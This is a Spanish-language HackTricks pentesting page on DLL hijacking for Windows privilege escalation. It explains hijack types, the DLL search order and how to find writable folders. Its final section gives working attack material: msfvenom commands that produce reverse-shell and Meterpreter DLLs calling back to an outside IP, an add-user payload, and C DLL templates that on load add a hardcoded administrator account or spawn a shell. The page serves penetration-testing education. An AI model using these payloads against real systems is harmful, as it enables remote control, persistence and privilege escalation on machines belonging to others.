# Secuestro de DLL

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si estás interesado en una **carrera de hacking** y hackear lo imposible - ¡**estamos contratando**! (_se requiere fluidez en polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## Definición

En primer lugar, vamos a definir el concepto. El secuestro de DLL es, en el sentido más amplio, **engañar a una aplicación legítima/confiable para que cargue una DLL arbitraria**. Términos como _Secuestro del Orden de Búsqueda de DLL_, _Secuestro del Orden de Carga de DLL_, _Suplantación de DLL_, _Inyección de DLL_ y _Carga Lateral de DLL_ se utilizan a menudo -erróneamente- para referirse a lo mismo.

El secuestro de DLL se puede utilizar para **ejecutar** código, obtener **persistencia** y **elevar privilegios**. De los 3, el **menos probable** de encontrar es la **elevación de privilegios** con diferencia. Sin embargo, como esto forma parte de la sección de elevación de privilegios, me centraré en esta opción. Además, ten en cuenta que, independientemente del objetivo, el secuestro de DLL se realiza de la misma manera.

### Tipos

Existen **varios enfoques** entre los que elegir, y el éxito depende de cómo esté configurada la aplicación para cargar sus DLL requeridas. Los enfoques posibles incluyen:

1. **Reemplazo de DLL**: reemplazar una DLL legítima por una DLL maliciosa. Esto se puede combinar con _Proxying de DLL_ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)], que garantiza que todas las funcionalidades de la DLL original se mantengan intactas.
2. **Secuestro del orden de búsqueda de DLL**: las DLL especificadas por una aplicación sin una ruta se buscan en ubicaciones fijas en un orden específico \[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]. El secuestro del orden de búsqueda se produce al colocar la DLL maliciosa en una ubicación que se busca antes de la DLL real. Esto a veces incluye el directorio de trabajo de la aplicación objetivo.
3. **Secuestro de DLL fantasma**: colocar una DLL maliciosa en lugar de una DLL faltante/inexistente que una aplicación legítima intenta cargar \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)].
4. **Redirección de DLL**: cambiar la ubicación en la que se busca la DLL, por ejemplo, editando la variable de entorno `%PATH%`, o los archivos `.exe.manifest` / `.exe.local` para incluir la carpeta que contiene la DLL maliciosa \[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)].
5. **Reemplazo de DLL de WinSxS**: reemplazar la DLL legítima por la DLL maliciosa en la carpeta relevante de WinSxS de la DLL objetivo. A menudo se denomina carga lateral de DLL \[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)].
6. **Secuestro de DLL con ruta relativa**: copiar (y opcionalmente renombrar) la aplicación legítima en una carpeta donde el usuario pueda escribir, junto con la DLL maliciosa. En la forma en que se utiliza, esto tiene similitudes con la Ejecución de Proxy Binario (Firmado) \[[8](https://attack.mitre.org/techniques/T1218/)]. Una variación de esto es lo que se llama (de manera algo oximorónica) '_bring your own LOLbin_' \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)], en la que la aplicación legítima se lleva junto con la DLL maliciosa (en lugar de copiarse desde la ubicación legítima en la máquina de la víctima).

## Encontrar DLLs faltantes

La forma más común de encontrar DLLs faltantes dentro de un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

y mostrar solo la **Actividad del sistema de archivos**:

![](<../../.gitbook/assets/image (314).png>)

Si estás buscando **DLLs faltantes en general**, debes dejar esto ejecutándose durante algunos **segundos**.\
Si estás buscando una **DLL faltante dentro de un ejecutable específico**, debes configurar **otro filtro como "Nombre del proceso" "contiene" "\<nombre del ejecutable>", ejecutarlo y detener la captura de eventos**.
## Explotando Dlls faltantes

Para escalar privilegios, la mejor oportunidad que tenemos es poder **escribir una dll que un proceso privilegiado intentará cargar** en algún **lugar donde se buscará**. De esta manera, podremos **escribir** una dll en una **carpeta** donde la dll se busca antes que la carpeta donde se encuentra la **dll original** (caso extraño), o podremos **escribir en alguna carpeta donde se buscará la dll** y la **dll original no existe** en ninguna carpeta.

### Orden de búsqueda de Dlls

**Dentro de la** [**documentación de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes encontrar cómo se cargan específicamente las Dlls**.

En general, una **aplicación de Windows** utilizará **rutas de búsqueda predefinidas para encontrar las DLL** y verificará estas rutas en un orden específico. El secuestro de DLL generalmente ocurre colocando una DLL maliciosa en una de estas carpetas asegurándose de que la DLL se encuentre antes que la legítima. Este problema se puede mitigar haciendo que la aplicación especifique rutas absolutas a las DLL que necesita.

Puedes ver el **orden de búsqueda de DLL en sistemas de 32 bits** a continuación:

1. El directorio desde el cual se cargó la aplicación.
2. El directorio del sistema. Usa la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio. (_C:\Windows\System32_)
3. El directorio del sistema de 16 bits. No hay una función que obtenga la ruta de este directorio, pero se busca. (_C:\Windows\System_)
4. El directorio de Windows. Usa la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
1. (_C:\Windows_)
5. El directorio actual.
6. Los directorios que se enumeran en la variable de entorno PATH. Ten en cuenta que esto no incluye la ruta por aplicación especificada por la clave de registro **App Paths**. La clave **App Paths** no se utiliza al calcular la ruta de búsqueda de DLL.

Ese es el orden de búsqueda **predeterminado** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual asciende al segundo lugar. Para deshabilitar esta función, crea el valor de registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y establece su valor en 0 (el valor predeterminado está habilitado).

Si la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) se llama con **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Finalmente, ten en cuenta que **una dll se puede cargar indicando la ruta absoluta en lugar del nombre**. En ese caso, esa dll **solo se buscará en esa ruta** (si la dll tiene dependencias, se buscarán como si se hubieran cargado solo por nombre).

Existen otras formas de alterar el orden de búsqueda, pero no las explicaré aquí.

#### Excepciones en el orden de búsqueda de dll según la documentación de Windows

* Si una **DLL con el mismo nombre de módulo ya está cargada en memoria**, el sistema solo verifica la redirección y un manifiesto antes de resolver a la DLL cargada, sin importar en qué directorio se encuentre. **El sistema no busca la DLL**.
* Si la DLL está en la lista de **DLL conocidas** para la versión de Windows en la que se está ejecutando la aplicación, el **sistema utiliza su copia de la DLL conocida** (y las DLL dependientes de la DLL conocida, si las hay) **en lugar de buscar** la DLL. Para obtener una lista de DLL conocidas en el sistema actual, consulta la siguiente clave del registro: **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**.
* Si una **DLL tiene dependencias**, el sistema **busca** las DLL dependientes como si se hubieran cargado solo con sus **nombres de módulo**. Esto es cierto **incluso si la primera DLL se cargó especificando una ruta completa**.

### Escalando privilegios

**Requisitos**:

* **Encontrar un proceso** que se ejecute/ejecutará con **otros privilegios** (movimiento horizontal/lateral) que **no tenga una dll**.
* Tener **permisos de escritura** en cualquier **carpeta** donde se vaya a **buscar la dll** (probablemente el directorio del ejecutable o alguna carpeta dentro de la ruta del sistema).

Sí, los requisitos son complicados de encontrar ya que **por defecto es extraño encontrar un ejecutable privilegiado sin una dll** y es aún **más extraño tener permisos de escritura en una carpeta de la ruta del sistema** (por defecto no se puede). Pero, en entornos mal configurados esto es posible.\
En el caso de que tengas suerte y te encuentres cumpliendo con los requisitos, puedes revisar el proyecto [UACME](https://github.com/hfiref0x/UACME). Incluso si el **objetivo principal del proyecto es eludir el UAC**, es posible que encuentres allí una **prueba de concepto** de secuestro de DLL para la versión de Windows que puedes utilizar (probablemente solo cambiando la ruta de la carpeta donde tienes permisos de escritura).

Ten en cuenta que puedes **verificar tus permisos en una carpeta** haciendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **verificar los permisos de todas las carpetas dentro de la RUTA**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes verificar las importaciones de un ejecutable y las exportaciones de una DLL con:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para obtener una guía completa sobre cómo **abusar del secuestro de DLL para escalar privilegios** con permisos para escribir en una carpeta de **ruta del sistema**, consulta:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Herramientas automatizadas

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificará si tienes permisos de escritura en alguna carpeta dentro de la ruta del sistema.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las funciones de **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll_.

### Ejemplo

En caso de que encuentres un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una DLL que exporte al menos todas las funciones que el ejecutable importará de ella**. De todos modos, ten en cuenta que el secuestro de DLL es útil para [escalar desde el nivel de integridad medio a alto **(burlando el UAC)**](../authentication-credentials-uac-and-efs.md#uac) o desde **alto nivel de integridad a SYSTEM**. Puedes encontrar un ejemplo de **cómo crear una DLL válida** en este estudio de secuestro de DLL centrado en el secuestro de DLL para la ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguiente sección** puedes encontrar algunos **códigos DLL básicos** que pueden ser útiles como **plantillas** o para crear una **DLL con funciones no requeridas exportadas**.

## **Creación y compilación de DLLs**

### **Proxificación de DLL**

Básicamente, un **proxy de DLL** es una DLL capaz de **ejecutar tu código malicioso cuando se carga**, pero también de **exponer** y **funcionar** como se **espera**, **retransmitiendo todas las llamadas a la biblioteca real**.

Con la herramienta **[DLLirant](https://github.com/redteamsocietegenerale/DLLirant)** o **[Spartacus](https://github.com/Accenture/Spartacus)**, puedes **indicar un ejecutable y seleccionar la biblioteca** que deseas proxificar y **generar una DLL proxificada**, o **indicar la DLL** y **generar una DLL proxificada**.

### **Meterpreter**

**Obtener una shell inversa (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (no vi una versión x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tu propio

Ten en cuenta que en varios casos, la Dll que compilas debe **exportar varias funciones** que serán cargadas por el proceso víctima, si estas funciones no existen, el **binario no podrá cargarlas** y el **exploit fallará**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si estás interesado en una **carrera de hacking** y hackear lo inhackeable, ¡**estamos contratando!** (_se requiere fluidez en polaco, tanto escrito como hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
